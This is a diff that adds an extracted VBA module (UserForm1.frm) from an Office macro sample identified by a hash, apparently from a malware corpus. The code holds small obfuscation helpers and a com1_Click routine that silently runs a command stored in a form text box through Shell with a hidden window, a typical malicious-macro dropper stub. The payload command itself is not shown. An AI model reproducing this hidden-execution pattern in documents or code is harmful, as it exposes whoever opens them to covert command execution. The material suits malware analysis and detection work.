@@ -1,0 +1,62 @@
+Filename     : ./macros/7c4ee5ed1956a5e51c0d52e90da16337b6172ca5f75b966a9c58f9ad7535df04
+OLE stream   : Macros/VBA/UserForm1
+VBA filename : UserForm1.frm
+----------------------------------------
+Attribute VB_Name = "UserForm1"
+Attribute VB_Base = "0{A677F399-4E55-43F0-A901-3E83CF46593A}{E54B1762-43BF-4332-8EA3-0745F5DE346A}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+
+Function parseStr(judd)
+Dim s As Integer
+s = judd
+parseStr = Chr$(s)
+End Function
+
+
+Private Sub CommandButton2_Click()
+UserForm1.TextBox1.Text = ""
+End Sub
+
+Function zunData(nij)
+temp = 0
+zunData = UBound(nij) + temp
+End Function
+
+
+Private Sub com2_Click()
+
+End Sub
+
+Private Sub but2_Click()
+
+End Sub
+
+Private Sub ListBox1_Click()
+UserForm1.TextBox2.Text = ""
+End Sub
+
+
+Sub com1_Click()
+Dim Im As Integer
+Im = 0
+UserForm1.TextBox2.Text = ""
+Dim s As String
+s = "Hands"
+If UserForm1.TextBox1.Tag = "" Then
+Shell UserForm1.TextBox1.Text, Im
+End If
+End Sub
+
+Private Sub TextBox1_Change()
+
+End Sub
+
+Private Sub TextBox2_Change()
+
+End Sub
